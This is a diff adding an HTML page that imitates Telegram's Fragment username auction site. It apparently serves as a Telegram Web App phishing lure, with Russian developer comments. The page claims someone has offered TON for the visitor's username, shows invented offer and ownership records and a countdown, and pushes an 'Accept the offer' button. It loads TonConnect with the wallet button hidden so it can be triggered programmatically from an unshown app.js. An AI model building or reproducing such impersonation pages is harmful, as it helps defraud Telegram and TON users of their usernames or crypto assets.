@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Fragment</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
+    
+    <!-- Стили. Если файлы лежат в public, напиши просто "auction.css" -->
+    <link href="https://raw.githubusercontent.com/kaitoshoma04-hub/fragment-auction/main/font-roboto.css" rel="stylesheet" type="text/css">
+    <link href="https://raw.githubusercontent.com/kaitoshoma04-hub/fragment-auction/main/bootstrap.min.css" rel="stylesheet">
+    <link href="https://raw.githubusercontent.com/kaitoshoma04-hub/fragment-auction/main/bootstrap-extra.css" rel="stylesheet">
+    <link href="https://raw.githubusercontent.com/kaitoshoma04-hub/fragment-auction/main/auction.css" rel="stylesheet">
+</head>
+<body class="emoji_image no-transition">
+    <div id="aj_content">
+        <!-- Шапка -->
+        <header class="tm-header">
+            <div class="tm-header-logo">
+                <a href="#" class="tm-logo js-logo" style="pointer-events: none;">
+                    <i class="tm-logo-icon"></i>
+                    <i class="tm-logo-text"></i>
+                </a>
+            </div>
+            <div class="tm-header-body">
+                <form action="#" class="tm-header-search-form">
+                    <div class="icon-before icon-search tm-field tm-search-field">
+                        <input type="search" class="form-control tm-input tm-search-input" placeholder="Search usernames" autocomplete="off" />
+                    </div>
+                </form>
+            </div>
+            <div class="tm-header-menu-button js-header-menu-button icon-before icon-header-menu"></div>
+        </header>
+
+        <main class="tm-main js-main-content">
+            <section class="tm-section tm-auction-section">
+                <div class="tm-section-header">
+                    <h2 class="tm-section-header-text">
+                        <span class="tm-section-header-domain">
+                            <span class="tm-web3-address">
+                                <span class="subdomain" id="display-username">loading</span>
+                                <span class="domain">.t.me</span>
+                            </span>
+                        </span>
+                        <span class="tm-section-header-status tm-status-avail">Claimed</span>
+                    </h2>
+                </div>
+                
+                <div class="tm-section-box tm-section-bid-info">
+                    <div class="tm-bid-info-text">
+                        <b>What is this?</b><br><br>
+                        Someone offered <span class="icon-before icon-ton"><b><span id="display-price">0</span></b></span> for your username. If the price suits you, press "Accept the offer".<br><br>
+                        <a href="#">How does this work?</a>
+                    </div>
+                </div>
+
+                <div class="tm-list tm-section-box tm-section-auction-info">
+                    <dl class="tm-list-item">
+                        <dt class="tm-list-item-title">Telegram Username</dt>
+                        <dd class="tm-list-item-value">
+                            <span class="accent-color">@<span id="info-username">loading</span></span>
+                        </dd>
+                    </dl>
+                    <dl class="tm-list-item">
+                        <dt class="tm-list-item-title">Web Address</dt>
+                        <dd class="tm-list-item-value">
+                            <span class="accent-color">t.me/<span id="info-web">loading</span></span>
+                        </dd>
+                    </dl>
+                    <dl class="tm-list-item">
+                        <dt class="tm-list-item-title">TON Web 3.0 Address</dt>
+                        <dd class="tm-list-item-value">
+                            <span class="accent-color"><span class="tm-web3-address"><span class="subdomain" id="info-ton">loading</span><span class="domain">.t.me</span></span></span>
+                        </dd>
+                    </dl>
+                </div>
+
+                <div class="tm-section-box tm-section-countdown-wrap">
+                    <div class="tm-section-countdown">
+                        <span class="tm-countdown-label short">Ends in</span>
+                        <time class="tm-countdown-timer">
+                            <span class="reel"><b class="digit" id="t-days">6 days</b></span>
+                            <span class="reel"><b class="digit" id="t-h0">2</b></span>
+                            <span class="reel"><b class="digit" id="t-h1">3</b></span>
+                            <span class="reel"><b class="digit" id="t-m0">5</b></span>
+                            <span class="reel"><b class="digit" id="t-m1">5</b></span>
+                            <span class="reel"><b class="digit" id="t-s0">4</b></span>
+                            <span class="reel"><b class="digit" id="t-s1">8</b></span>
+                        </time>
+                    </div>
+                </div>
+
+                <div class="tm-section-box tm-section-buttons">
+                    <button id="accept-btn" class="btn btn-primary" disabled>Loading...</button>
+                </div>
+            </section>
+
+            <section class="tm-section clearfix">
+                <div class="tm-section-header">
+                    <h3 class="tm-section-header-text">Latest Offers</h3>
+                </div>
+                <div class="tm-table-wrap">
+                    <table class="table tm-table tm-table-fixed">
+                        <thead>
+                            <tr>
+                                <th style="--thin-width:100px;--wide-width:25%">Offer</th>
+                                <th style="--thin-width:110px;--wide-width:25%">Date</th>
+                                <th style="--width:50%">Offered by</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>
+                                    <div class="table-cell">
+                                        <div class="table-cell-value tm-value icon-before icon-ton" id="latest-price">0</div>
+                                    </div>
+                                </td>
+                                <td>
+                                    <div class="table-cell">
+                                        <div class="tm-datetime">
+                                            <span class="thin-only">Today at <span id="latest-time">00:00</span></span>
+                                        </div>
+                                    </div>
+                                </td>
+                                <td>
+                                    <div class="table-cell">
+                                        <a href="#" class="tm-wallet"><span class="short">UQDm89iC...vEnlMO6e</span></a>
+                                    </div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <section class="tm-section clearfix">
+                <div class="tm-section-header">
+                    <h3 class="tm-section-header-text">Ownership History</h3>
+                </div>
+                <div class="tm-table-wrap">
+                    <table class="table tm-table tm-table-fixed">
+                        <thead>
+                            <tr>
+                                <th style="--thin-width:100px;--wide-width:25%">Sale price</th>
+                                <th style="--thin-width:110px;--wide-width:25%">Date</th>
+                                <th style="--width:50%">Buyer</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>
+                                    <div class="table-cell">
+                                        <div class="table-cell-value tm-value icon-before icon-ton">10</div>
+                                    </div>
+                                </td>
+                                <td>
+                                    <div class="table-cell">
+                                        <div class="tm-datetime">
+                                            <span class="thin-only">Nov 21 at 21:39</span>
+                                        </div>
+                                    </div>
+                                </td>
+                                <td>
+                                    <div class="table-cell">
+                                        <a href="#" class="tm-wallet"><span class="short">UQCXv...HWJ_4</span></a>
+                                    </div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Скрываем TonConnect кнопку, так как вызываем программно -->
+    <div id="ton-connect" style="display: none;"></div>
+    <script src="/app.js"></script>
+</body>
+</html>
